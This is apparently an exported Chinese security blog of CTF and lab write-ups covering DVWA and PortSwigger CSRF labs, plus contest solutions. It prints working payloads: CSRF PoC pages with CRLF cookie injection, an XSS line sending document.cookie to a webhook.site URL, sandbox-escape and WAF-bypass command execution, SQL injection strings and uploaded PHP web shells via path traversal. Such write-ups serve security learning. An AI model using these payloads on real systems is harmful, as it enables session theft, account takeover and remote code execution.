isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])：这部分代码首先检查$GLOBALS[&quot;___mysqli_ston&quot;]是否已经设置且为一个有效的MySQL连接对象。如果是，则表示数据库连接已经建立，可以执行转义操作；如果不是，则表示数据库连接尚未建立，无法执行转义操作。
mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new )：如果数据库连接已经建立，将调用mysqli_real_escape_string函数对新密码进行转义处理。这个函数会对字符串中的特殊字符进行转义，以防止它们被误解为SQL语句的一部分，从而防止SQL注入攻击。
(trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)：如果数据库连接未建立，或者转义操作失败，将会触发一个错误，并输出错误消息。这段代码似乎是为了提醒开发者修复MySQL转义函数调用的问题，因为它使用了已经弃用的mysql_escape_string函数，而不是推荐的mysqli_real_escape_string函数

该网站通过mysqli_real_escape_string()函数的过滤作用，将用户传入的数据中的特殊字符进行转义，对SQL注入做了防御。但没有对CSRF做任何防范措施
正常输入密码，然后抓包

用burpsuite自带的CSRF PoC进行攻击，将其生成的把CSRF HTML复制到本地，然后用该浏览器访问

点击提交请求后自动跳转到我们的页面，并且此时密码已被成功修改

以上过程中要注意的是一定不要中途更换浏览器，访问csrf.php的时要同一个浏览器访问，并且还要保证你登录DVWA的cookie没有过期，不然会因为缺少身份验证信息而执行失败
Medium级别&lt;?phpif( isset( $_GET[ &#x27;Change&#x27; ] ) ) &#123;    // Checks to see where the request came from    if( stripos( $_SERVER[ &#x27;HTTP_REFERER&#x27; ] ,$_SERVER[ &#x27;SERVER_NAME&#x27; ])!=-1 ) &#123;        // Get input        $pass_new  = $_GET[ &#x27;password_new&#x27; ];        $pass_conf = $_GET[ &#x27;password_conf&#x27; ];        // Do the passwords match?        if( $pass_new == $pass_conf ) &#123;            // They do!            $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));            $pass_new = md5( $pass_new );            // Update the database            $insert = &quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot; . dvwaCurrentUser() . &quot;&#x27;;&quot;;            $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );            // Feedback for the user            echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;        &#125;        else &#123;            // Issue with passwords matching            echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;        &#125;    &#125;    else &#123;        // Didn&#x27;t come from a trusted source        echo &quot;&lt;pre&gt;That request didn&#x27;t look correct.&lt;/pre&gt;&quot;;    &#125;    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;?&gt;

stripos( $_SERVER[ &#39;HTTP_REFERER&#39; ] ,$_SERVER[ &#39;SERVER_NAME&#39; ])!=-1：检查当前请求的Referer头中是否包含当前服务器的域名。如果包含，则条件为真，表示请求来源于当前服务器；如果不包含，则条件为假，表示请求不是从当前服务器发出的
stripos()：这是一个字符串函数，用于在一个字符串中查找子字符串的位置，不区分大小写
综上，与low级别相比，该级别不能够跨域访问
但是只要在报头的referer处输入：127.0.0.1就可以成功绕过
所以同样我们抓包，构造poc，这次我们把密码改成admin007并保存为127.0.0.1.html文件

然后使用浏览器进行访问，点击提交请求后自动跳转到我们的页面，并且此时密码已被成功修改
High级别&lt;?phpif( isset( $_GET[ &#x27;Change&#x27; ] ) ) &#123;    //用于检查令牌（Token）的有效性，以确保请求的合法性，如果令牌验证失败时要重定向的页面为index.php    checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; );    // Get input    $pass_new  = $_GET[ &#x27;password_new&#x27; ];    $pass_conf = $_GET[ &#x27;password_conf&#x27; ];    // Do the passwords match?    if( $pass_new == $pass_conf ) &#123;        // They do!        $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));        $pass_new = md5( $pass_new );        // Update the database        $insert = &quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot; . dvwaCurrentUser() . &quot;&#x27;;&quot;;        $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );        // Feedback for the user        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;    &#125;    else &#123;        // Issue with passwords matching        echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;    &#125;    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;//生成一个会话令牌，并将其存储在会话中generateSessionToken();?&gt;

经过分析发现High级别的代码加入了Anti-CSRF token机制，用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求
CSRF防御之道1、尽量POST
GET太容易被CSRF攻击了，用POST可以降低风险，但也不能保证万无一失， 攻击者只要构造一个form就可以，但需要在第三方页面做，这样就增加暴露的可能性。
2、加入验证码
在POST的基础上可以再加一个验证码，用户每次提交数据时都需要在表单中填写验证码，这个方案大幅度的降低CSRF攻击，一些简单的验证码可能会被hacker破解，但一般情况下，验证码是很难被破解的。
3、验证Referer
就像上面的Medium级别那样，在验证时添加一个Referer，判断请求的来源地址是否是当前网页，如果是，则可以认为该请求是合法的，否则就拒绝用户请求。
4、Anti CSRF Token
CSRF攻击之所以能够成功，是因为攻击者可以伪造用户的请求，该请求中所有的用户验证信息都存在于cookie中，因此攻击者可以在不知道用户验证信息的情况下直接利用用户的cookie来通过安全验证。由此可知，抵御CSRF攻击的关键在于：在请求中放入攻击者所不能伪造的信息，并且该信总不存在于cookie之中。
在开发过程中我们可以在HTTP请求中以参数的形式加入一个随机产生的token，并在服务端进行token校验，如果请求中没有token或者token内容不正确，则认为是CSRF攻击而拒绝该请求
bp’s labLab：没有防御措施的 CSRF 漏洞题目提示电子邮件更改功能容易受到 CSRF 的攻击
所以我们登录账号之后转到电子邮件更改界面，进行抓包，将其发送到重放器中

可以看到报头中有referer，我们尝试删除并再次发送查看回显，发现一切正常，说明后端并没有验证referer
存在csrf漏洞，右键生成poc，复制html到bp的漏洞利用服务器中，可以自己先测试一下，但完成测试后要改一下邮箱地址，发送给受害者，题目解决
Lab：令牌验证取决于请求方法的 CSRF依旧是电子邮件更新功能容易受到攻击
登录账号之后转到电子邮件更改界面，进行抓包，将其发送到重放器中
这次有令牌进行验证，如下：

尝试直接修改令牌值，失败，更改邮箱请求被拒绝
标题：令牌验证取决于请求方法的 CSRF，给了我们另一种思路
我们尝试右键更改请求方式为get，然后对令牌值进行随意修改，请求成功，说明更改请求方式后后端没有验证令牌值
所以我们直接生成poc，复制html到bp的漏洞利用服务器中，送给受害者，题目解决
Lab：CSRF，其中令牌验证取决于令牌的存在依旧是电子邮件更新功能容易受到攻击
登录账号之后转到电子邮件更改界面，进行抓包，将其发送到重放器中
有令牌验证，但是根据标题中的令牌验证取决于令牌的存在这句话，尝试直接把令牌全部删除，发送请求成功
于是直接生成Poc，复制html到bp的漏洞利用服务器中，送给受害者，题目解决
Lab：令牌与用户会话无关的 CSRF此实验室的电子邮件更改功能容易受到 CSRF 的攻击。它使用令牌来尝试防止 CSRF 攻击，但它们没有集成到站点的会话处理系统中
这次我们拥有两个账号，首先登录一个账号并抓包，这次的令牌既不能修改，删除后也没有起到任何作用，更改请求方式也不行
查看代理模块的HTTP历史记录中的/my-account?id=wiener，检查后发现token值是在该条目中生成的，具体代码为：                           &lt;input required type=&quot;hidden&quot; name=&quot;csrf&quot; value=&quot;MwT3m0JuawJpnibLHLd4XDpvLMw9GMWx&quot;&gt;
于是我们把这个token值复制到另一个账号的修改邮箱的抓包界面中替换一下，点击发送，请求成功
这说明了后端只检查令牌是否正确，没有检查令牌的来源是否是该用户
于是我们可以生成poc，复制html到bp的漏洞利用服务器中，需要注意，token一旦被使用过便不会再发挥作用，所以我们需要一个从来没有被用过的令牌
重新把更改邮箱的页面再加载一下，抓下包，获得新的token值，这时要注意不能把该请求放行，就把它挂在那边就好了，然后把得到的新的令牌值复制到代码里面，存储后发送给受害者，题目解决
Lab：令牌绑定到非会话 Cookie 的 CSRF&lt;html&gt;  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;  &lt;body&gt;    &lt;form action=&quot;https://0a0000880458d70780af219200c400fa.web-security-academy.net/my-account/change-email&quot; method=&quot;POST&quot;&gt;      &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;123456&amp;#64;123&quot; /&gt;      &lt;input type=&quot;hidden&quot; name=&quot;csrf&quot; value=&quot;dxpxBVZLqU1g14UUD2dv4omHuDneB7yH&quot; /&gt;      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;    &lt;/form&gt;    &lt;img src=&quot;https://0a0000880458d70780af219200c400fa.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=ZfUOIWcnpwgpxoFwNzvS9oeXgQxA03PJ%3b%20SameSite=None&quot; onerror=&quot;document.forms[0].submit()&quot;&gt;  &lt;/body&gt;&lt;/html&gt;



Lab：在 cookie 中复制令牌的 CSRF此实验室的电子邮件更改功能容易受到 CSRF 的攻击。它尝试使用不安全的“双重提交”CSRF 预防技术。
我们登录账号后更新邮箱，抓包，如下：
可以发现Cookie中的csrf和传参中的csrf是一样的，观察 到csrf body 参数的值是通过其与 csrf cookie 进行比较来验证，也就是说我们只需要这两个csrf的值一样便可以成功绕过
返回主页执行搜索功能，到代理中的HTTP历史记录中找到该条目，发送到重放器中，发送请求，回显如下：
发现搜索词反映在 Set-Cookie 标头中。由于搜索功能没有 CSRF 保护，可以使用它向受害者用户的浏览器注入 cookie
比如：/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None（有涉及到xss）
其中的 &#96;&#96;SameSite&#x3D;None：在默认情况下，浏览器在跨站请求（例如从一个网站向另一个网站发送请求）时不会发送第三方Cookie。这是浏览器的同源策略的一部分，旨在防止跨站请求伪造（CSRF）攻击和其他安全威胁。然而，有时候我们确实需要在跨站请求时发送Cookie，比如在使用单点登录（Single Sign-On）或者嵌入其他网站的资源（例如图片或iframe）时。这就需要使用SameSite&#x3D;None属性来解除浏览器的限制。当设置了SameSite&#x3D;None&#96;属性时，表示该Cookie可以在跨站请求中发送
于是我们构造poc如下：
&lt;html&gt;  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;  &lt;body&gt;    &lt;form action=&quot;https://0ad300b7031c7394812e7087006a0086.web-security-academy.net/my-account/change-email&quot; method=&quot;POST&quot;&gt;      &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;123456&amp;#64;123&quot; /&gt;      &lt;input type=&quot;hidden&quot; name=&quot;csrf&quot; value=&quot;fake&quot; /&gt;      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;    &lt;/form&gt;    &lt;img src=&quot;https://0ad300b7031c7394812e7087006a0086.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None&quot; onerror=&quot;document.forms[0].submit();&quot;/&gt;  &lt;/body&gt;&lt;/html&gt;

保存，将其发送给受害者，题目解决
Lab：通过方法覆盖绕过 SameSite Lax在更改邮箱地址界面抓包，把抓到的发送到重放器中，发送，得到的响应头中有一条为：X-Frame-Options: SAMEORIGIN这说明了允许该页面在相同源（即相同域名）的 &lt;frame&gt;、&lt;iframe&gt; 或者 &lt;object&gt; 标签中加载
除此之外也没有任何的令牌来限制
查看响应发现网站在设置会话 cookie 时没有明确指定任何 SameSite 限制。因此，浏览器将使用默认的 Lax 限制级别，这意味着会话 cookie 将在跨站点 GET 请求中发送，只要它们涉及顶级导航
顶级导航：指的是浏览器的地址栏导航，即在浏览器的地址栏输入网址并按下回车，或者通过点击链接进行的页面跳转，这种跳转会改变浏览器的顶级窗口内容
于是我们尝试更改请求方式为get，然后发送，回显表示该页面只允许post传参
向get传参中添加 &amp;_method=POST：用于在HTML表单不支持的情况下模拟PUT、DELETE等HTTP方法。这种技术通常在RESTful风格的Web应用中使用，以绕过浏览器和HTML表单的限制
再次发送，成功，所以我们便可以在漏洞利用服务器中输入如下代码
&lt;script&gt;document.location=&quot;https://0a77000403d1fecd80be4987002a0052.web-security-academy.net/my-account/change-email?email=1236%40123&amp;_method=POST&quot;&lt;/script&gt;

保存并发送给受害者，题目解决
Lab：通过客户端重定向绕过 SameSite Strict首先在更改电子邮箱的界面抓包，把抓到的发送到重放器中

发送，得到的响应头中有一条为：X-Frame-Options: SAMEORIGIN
尝试更改请求方式为get，然后发送，回显说明修改电子邮箱成功，无需其他操作便可以成功修改，当时以为已经成功了，直接去漏洞利用服务器中写代码，发送给受害者，但是失败了，表明直接这样修改的话是行不通的
回到主页上进入任意一篇博客中进行评论，然后查看bp的代理模块中的HTTP历史记录，查看了 /post/comment/confirmation?postId=2，其响应中有好东西如下：
于是我们转去查看条目/resources/js/commentConfirmationRedirect.js，所需函数如下：
redirectOnConfirmation = (blogPath) =&gt; &#123;    setTimeout(() =&gt; &#123;        const url = new URL(window.location);        const postId = url.searchParams.get(&quot;postId&quot;);        window.location = blogPath + &#x27;/&#x27; + postId;    &#125;, 3000);&#125;

易得这是一个可以重定向页面的函数，上面的 blogPath为/post，postId为2，于是会重定向到相关的页面
根据这个函数我们可以联想到目录穿越，于是进行尝试：/post/comment/confirmation?postId=../../../my-account，成功重定向到该界面，接着尝试：/post/comment/confirmation?postId=../../../my-account/change-email?email=admin%40145623%26submit=1（特殊字符记得编码），成功修改邮箱
于是在漏洞利用服务器中可以写出如下代码：
&lt;script&gt;    document.location = &quot;https://0acd0042033dadfd81f92ff80050003c.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1&quot;;&lt;/script&gt;

保存，发送给受害者，题目解决
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>csrf</tag>
      </tags>
  </entry>
  <entry>
    <title>ROIS冬令营题解</title>
    <url>/2024/01/30/ROIS%E5%86%AC%E4%BB%A4%E8%90%A5%E9%A2%98%E8%A7%A3_max/ROIS%E5%86%AC%E4%BB%A4%E8%90%A5%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[1.http（极客大挑战）首先查看源码发现 &lt;a style=&quot;border:none;cursor:default;&quot; onclick=&quot;return false&quot; href=&quot;Secret.php&quot;&gt;，点击该链接
然后通过页面信息修改referer：https://Sycsecret.buuoj.cn
接着浏览器信息，即 User-Agent:Syclover，然后告诉我们要从本地查看，上网查找发现本地都是这个端口号 127.0.0.1，修改xxf，然后flag就出来了
2.查看网页的备份文件（攻防世界）php的备份文件有两种：*.php~和*.php.bak
例子：http://61.147.171.105:55767/index.php.bak
3.php2（攻防世界）对网址后面加上&#x2F;index.phps就可以查看页面php源码
例子：http://111.198.29.45:45191/index.phps
phps是php的源代码文件，但是不能接受传参，所以hackbar还是要在.php里面做
4.cookie（攻防世界）如何查看http响应
打开开发者工具，再点击网络(network)，选择你想要查看http响应的网址
这道题的flag位于标头里面
5.扫描目录用dirsearch（攻防世界）dirsearch -u &lt;URL&gt;是要扫描的目标网站的URL
可以用以下选项来调整扫描：
-e:指定要排除的扩展名
-f:指定要包含的扩展名
-x:指定要排除的目录
-t:指定线程数
例子：dirsearch -u https://example.com/ -f php,html -t 50（用50个线程扫描一个URL，只包括.php和.html文件）
dirsearch -u https://example.com/ -o result.txt

将扫描结果保存到result.txt文件中
6.easy-PDD这道题先用bp抓包，然后用bp中的爆破模式，也就是Intruder模式来发送好多好多的请求包，得到flag
具体爆破模式操作步骤可以参考：https://blog.csdn.net/FTQOOO/article/details/103822526
7.ez_maze分析：弹出警告框是因为鼠标的移动碰到了迷宫的线导致的，就是js中的onmouseover事件，所以有以下几种解法
第一种：玩通关，实践过可以的，难度还行
第二种：通过弹出警告框后鼠标怎么移动都没有事情，可以借此先把鼠标移至红点区域，然后按回车键，再触碰红点就得到flag了
第三种：用手机进入这个网址，然后直接点红点
第四种：通过源码的逻辑来，等待有缘人ing
8.Matryoshka doll下载文件完后把那个文件的内容疯狂拿去转码，解码，需要多种，比如base64解码，urldecode等，可以借助gpt帮帮忙
9.三题sql注入easy：账号名使用万能密钥 1&#39; or 1=1；然后密码随便输入一个
normal：按照正常的union注入来进行操作，需要注意的是只会回显第二个字段，所以所有操作要在 select 1,2,3的2处进行
hard：使用布尔盲注，最好使用脚本来，嗖嗖爆出所需东西，需要注意的是账号密码的name属性分别是username，password
10.xss-1function report()&#123;		document.location = `http://$&#123;document.location.hostname&#125;:8001/report.html?e=`+btoa(document.querySelector(&#x27;#input-textarea&#x27;).value)	&#125;	function execute(payload)&#123;		try&#123;			let parsed = acorn.parse(payload, &#123; ecmaVersion: &#x27;latest&#x27; &#125;).body;			alert(eval(payload));		&#125; catch(e)&#123; 			alert(&#x27;Error: &#x27;+e);		&#125;	&#125;	window.onload = _=&gt;&#123;		let p = (new URLSearchParams(document.location.search)).get(&#x27;e&#x27;);		if(p) execute(atob(p));	&#125;

上述代码理解透彻即可做出题目（透彻！！！）
payload：window.open(&#39;https://webhook.site/346c0b70-1254-4efc-a539-54c670644ab2?&#39;+document.cookie)
11.unserialize-1&lt;?php$flag = &#x27;ROIS&#123;test&#125;&#x27;;class Name&#123;    public $name;    public $password;    public function __get($name) &#123;        echo $this-&gt;name;        return $name;    &#125;    public function __wakeup() &#123;        if($this-&gt;password!=null)&#123;            echo $this-&gt;password;        &#125;        else&#123;            echo $this-&gt;name;        &#125;    &#125;    public function __toString() &#123;        global $flag;        echo $flag;        return &quot;nice&quot;;    &#125;&#125;unserialize($_GET[&#x27;input&#x27;]);

__toString()必须在echo对象的情况下才能够自动使用，所以要一个对象要包含另一个对象，这两个对象同属于一个类里面，代码如下
&lt;?php$flag = &#x27;ROIS&#123;test&#125;&#x27;;class Name&#123;    public $name;    public $password;    public function __construct($name,$password)&#123;        $this-&gt;name = $name;        $this-&gt;password = $password;&#125;&#125;$a = new Name(&#x27;John&#x27;,&#x27;222&#x27;);$input = new Name(&#x27;Joe&#x27;,$a);echo serialize($input);

序列化后的字符串：O:4:&quot;Name&quot;:2:&#123;s:4:&quot;name&quot;;s:3:&quot;Joe&quot;;s:8:&quot;password&quot;;O:4:&quot;Name&quot;:2:&#123;s:4:&quot;name&quot;;s:4:&quot;John&quot;;s:8:&quot;password&quot;;s:3:&quot;222&quot;;&#125;&#125;
然后 ?input=O:4:&quot;Name&quot;:2:&#123;s:4:&quot;name&quot;;s:3:&quot;Joe&quot;;s:8:&quot;password&quot;;O:4:&quot;Name&quot;:2:&#123;s:4:&quot;name&quot;;s:4:&quot;John&quot;;s:8:&quot;password&quot;;s:3:&quot;222&quot;;&#125;&#125;，得到flag
12.ez_rce_plus?&lt;?phphighlight_file(__FILE__);if (@$_SERVER[&#x27;HTTP_KEY&#x27;] !== &quot;Nzc2NTZjNjU2MzZmNmQ2NTVmNzQ2ZjVmNzI2ZjY5NzMyMQ==&quot;)    die(&quot;authentication failed!!&quot;);else&#123;    $nameFunction = htmlspecialchars(@$_POST[&quot;function&quot;]); unset($_POST[&quot;function&quot;]);    if(!$nameFunction) $nameFunction = htmlspecialchars(@$_POST[&quot;action&quot;]); unset($_POST[&quot;action&quot;]);    $nameFunction = waf($nameFunction);    $nameFunction = explode(&quot;/&quot;,$nameFunction);    $nameFunction = $nameFunction[1];    if($nameFunction)&#123;        $params = array();        forEach($_POST as $key =&gt; $item)&#123;            $item = waf($item);            array_push($params, $item); unset($_POST[$key]);        &#125;        $base64 = false; if(isset($_SERVER[&quot;HTTP_BASE64&quot;]))&#123; $base64 = $_SERVER[&quot;HTTP_BASE64&quot;] === &#x27;true&#x27; ? true : false; &#125;        $params = join(&quot;&#x27;,&#x27;&quot;, $params); $eval = $nameFunction.&quot;(&#x27;&quot;.$params.&quot;&#x27;)&quot;; $return = eval(&#x27;return &#x27;.$eval.&quot;;&quot;); echo jsonEncode($return, $base64);    &#125;&#125;function jsonEncode($value, $base64_encode = true)&#123;    $value = json_encode($value, JSON_PRETTY_PRINT);    if($base64_encode) $value = base64_encode($value);    return $value;&#125;function waf($input) &#123;    $blacklist = [&#x27;system&#x27;, &#x27;exec&#x27;, &#x27;flag&#x27;];    foreach ($blacklist as $word) &#123;        $input = str_replace($word, &#x27;&#x27;, $input);    &#125;    return $input;&#125;

源码看懂那就不是个事
unset() 函数用于销毁指定变量
explode() 函数会将字符串按照指定的分隔符拆分成数组

forEach($_POST as $key =&gt; $item) 遍历了 $_POST 数组中的每个键值对，其中 $key 是键名，$item 是对应的值。
对每个 $item 值应用了 waf() 函数进行过滤，过滤后的结果存储回 $item 变量中。
使用 array_push($params, $item) 将过滤后的结果添加到了 $params 数组中。
使用 unset($_POST[$key]) 删除了原始 $_POST 数组中相应的键值对，以确保只保留了过滤后的数据

使用 join() 函数将数组 $params 中的元素以逗号连接成一个字符串，并且在每个元素之间添加了单引号
以下内容为反推回去的思路
$eval=system(&#x27;ls /&#x27;)$params=ls /$nameFunction=system$nameFunction=1/sysystemstemfunction=action=1/sysystemstema=ls /

所以最终post的内容如下所示：
function=1/sysystemstem&amp;action=1/sysystemstem&amp;a=ls /

得到flag位置后 function=1/sysystemstem&amp;action=1/sysystemstem&amp;a=cat /flflagag
13.ez_rce_with_full_waf?与12题的代码差不多，其中的waf()函数改为了下面所示：
function waf($input) &#123;    $blacklist = [&#x27;system&#x27;, &#x27;exec&#x27;, &#x27;flag&#x27; ,&#x27;`&#x27; ,&#x27;eval&#x27; ,&#x27;call&#x27; ,&#x27;$&#x27; ,&#x27;php&#x27; ,&#x27;require&#x27; , &#x27;_&#x27; , &#x27;file&#x27; ,&#x27;show&#x27; , &#x27;include&#x27;, &#x27;\&#x27;&#x27; , &#x27;&quot;&#x27; , &#x27;.&#x27;  , &#x27;&lt;&#x27; , &#x27;&gt;&#x27; ];    foreach ($blacklist as $word) &#123;        $input = str_replace($word, &#x27;hack!&#x27;, $input);    &#125;    return $input;&#125;

我们可以通过不给function赋值，给action赋值绕过第一个waf：action=1/system&amp;a=ls /
第二个waf我们可以通过通配符来绕过：action=1/sysystemstem&amp;a=cat /fl??，得到最终的flag
]]></content>
      <categories>
        <category>Write-Up</category>
      </categories>
  </entry>
  <entry>
    <title>校赛题解</title>
    <url>/2024/04/06/%E6%A0%A1%E8%B5%9B%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[Misc先来签个到吧点击链接，百度网盘提取，看视频
看到要到一半的时候会突然闪过一个二维码，于是就是见手速的时候了，在这几秒疯狂疯狂暂停，最终暂停到了二维码处，扫码得到flag
爬山给了一张图片
打开kali，在终端输入命令：exiftool 图片名，得到图片的具体信息，最后几行是拍摄的经纬度：24 deg 30&#39; 17.30&quot; N；118 deg 3&#39; 20.03&quot; E，拿给gpt稍修一下得到：24°30&#39;17&quot;N 118°3&#39;20&quot;E，把该坐标拿到谷歌地球中搜索一下，发现位于厦门市海沧区的一个公园附近，已知小涂是小学生，上的是小学，开始社工，启动高德地图，搜索海沧区小学，把搜索到的小学名一个个输进去，最后得到是天堂山小学
webezzzzzzzzz_PTA进入环境发现要让我们写python代码，盲猜ssti漏洞
开始测试，首先输入 print([].__class__.__base__.__subclasses__())得到所有的子类，然后发现我要使用的&lt;class &#39;subprocess.Popen&#39;&gt;位于最后一个507，于是我们输入payload：[].__class__.__base__.__subclasses__()[507](&#39;ls /&#39;,shell=True,stdout=-1).communicate()[0].strip()
发现flag位于根目录处，继续 [].__class__.__base__.__subclasses__()[507](&#39;cat /flag&#39;,shell=True,stdout=-1).communicate()[0].strip()得到flag
Potato_Netdisk下载附件，得到源码，最开始是查看fileUpload.php，在文件上传那边使劲尝试目录穿越，也将..进行编码后进行上传，但无论怎样操作还是不行，想着文件会先存在临时目录中 /tmp/upload下面，tmp目录位于根目录处，当时想着临时存储和删掉文件之间会有一定的时间，想着条件竞争进行文件上传，但最终还是失败了
之后查看dirUpload.php文件，发现了以下代码：
function validateFilePath($path): void&#123;    if(str_contains($path,&#x27;..&#x27;.DIRECTORY_SEPARATOR) || str_contains($path,&#x27;/var/www/html&#x27;))&#123;        http_response_code(403);        die(&quot;非法上传路径！&quot;.&#x27;&lt;br&gt;&#x27;.$path);    &#125;&#125;function normalizeFilePath($path): string&#123;    if(strpos($_SERVER[&#x27;HTTP_USER_AGENT&#x27;], &#x27;Windows&#x27;))&#123;        return str_replace(&#x27;\\&#x27;,&#x27;/&#x27;,$path);    &#125;    return $path;&#125;

以及
if($_SERVER[&#x27;REQUEST_METHOD&#x27;] === &#x27;POST&#x27;)&#123;    foreach ($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;] as $key =&gt; $tmp_name)&#123;        $dest = UPLOAD_DIR.$_FILES[&#x27;file&#x27;][&#x27;full_path&#x27;][$key];        validateFilePath($dest);        uploadFile($tmp_name, normalizeFilePath($dest));    &#125;&#125;

上传的文件夹是先检测是否有非法路径然后再把 \改成 /，检测的函数用的是str_contains，所以我们可以有这样的绕过，用bp抓包，把上传的文件名改为..\..\..\..\var\www\html\shel.php，上传成功，文件内容为&lt;?php system(&#39;ls /&#39;);?&gt;
由于我们访问http://121.43.34.239:20017/index.php，就相当于访问/var/www/html/index.php，所以我们要访问上传的文件就是要访问http://121.43.34.239:20017/shell.php，得到根目录下的文件，接着把文件内容改为&lt;?php system(&#39;cat /flag&#39;);?&gt;，得到我们所需要的flag
Potato_Netdisk_v2.0有了上题的经验，这题我们直接看dirUpload.php，发现了与第一题不一样的地方，如下：
function validateFilePath($path): void&#123;    if(str_contains($path,&#x27;..&#x27;.DIRECTORY_SEPARATOR) || preg_match(&#x27;/var.www.html/&#x27;,$path))&#123;        http_response_code(403);        die(&quot;非法上传路径！&quot;.&#x27;&lt;br&gt;&#x27;.$path);    &#125;&#125;

发现了preg_match(&#39;/var.www.html/&#39;,$path)，正则表达式中的.表示匹配任意字符，所以按照上一题的思路绕过的话是行不通的，然后想到了可以通过通配符来进行绕过，页面是会显示文件成功上传，但是会显示报错，所以这种思路也是不行的，后面进行条件竞争的时候会失败，继续思考想到了可以通过\var\www\.\html来进行绕过，文件成功上传，并且没有报错
再看到如下的代码：
//清除网页目录下的其他文件function cleanup($dir): void&#123;    global $file_whitelist;    $files = scandir($dir);    $files = array_diff($files,$file_whitelist);    foreach ($files as $file)&#123;        $path = $dir.&#x27;/&#x27;.$file;        @unlink($path);    &#125;&#125;if($_SERVER[&#x27;REQUEST_METHOD&#x27;] === &#x27;POST&#x27;)&#123;    foreach ($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;] as $key =&gt; $tmp_name)&#123;        $dest = UPLOAD_DIR.$_FILES[&#x27;file&#x27;][&#x27;full_path&#x27;][$key];        validateFilePath($dest);        uploadFile($tmp_name, normalizeFilePath($dest));    &#125;    cleanup(__DIR__);&#125;

发现在文件成功上传之后，会清除掉除了白名单外的其他所有文件，白名单如下：
file_whitelist = array(    &#x27;.&#x27;,    &#x27;..&#x27;,    &#x27;index.php&#x27;,    &#x27;config.php&#x27;,    &#x27;dirUpload.php&#x27;,    &#x27;fileUpload.php&#x27;);

可以发现，在文件成功上传和删除之间存在时间差，可以利用条件竞争，分别用bp抓/dirUpload.php（上传文件）以及 /shell.php（用来访问所上传的文件）
上传文件的条目先发送到重放器中，修改filename为..\..\..\..\var\www\.\html\shell.php，上传文件的内容为&lt;?php system(&#39;cat /flag&#39;);?&gt;，接着把两个都放到intruder模块下来，选择无payload，两边一起开始攻击，然后查看访问文件的那个，发现状态码为200，成功访问，得到flag
